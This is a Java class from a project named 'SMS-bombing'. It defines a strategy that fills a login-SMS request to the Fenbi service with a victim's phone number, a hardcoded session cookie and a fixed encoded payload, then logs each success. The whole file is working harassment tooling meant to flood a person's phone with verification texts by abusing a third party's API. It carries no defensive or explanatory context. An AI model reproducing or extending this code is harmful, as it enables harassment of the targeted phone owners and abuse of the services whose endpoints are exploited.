package com.github.bombing.strategy;

/**
 * @projectName: SMS-bombing
 * @package: com.github.bombing.execute.strategy
 * @className: FenBiStrategy
 * @date: 2022/3/15
 * @version: 1.0
 */
public class FenBiStrategy extends AbstractBombingStrategy<String> {

    @Override
    public Strategy strategy() {
        return Strategy.FENBI;
    }

    @Override
    protected void before() {
        HEADERS.put(COOKIE, "sid=3489701331939606254");
        HEADERS.put(CONTENT_TYPE, "multipart/form-data; boundary=" + uuid());
    }

    @Override
    protected String body() {
        String body = "phone=%s&type=login&info=Oi10YTW4eto2KZ9gr7lnHYDC8nLJG0WQ52LuNyuuJU3TwAGiSV+Lp6Jx0zmRbbdlIyUzXQziGAkS0mR2HdAg02rDID/YXFqitC+j05vwupn1VdqkjP6itIdH+JgMvCMl8eEyF+AuOYXbcHc+cU9I0OQ8FFKYelqAq8aHjV/XEn8=";
        return String.format(body, phone);
    }

    @Override
    protected void doResp(String res) {
        logger.info(">>> " + strategy().getDesc() + " 请求成功, 返回内容为: " + res);
    }

}
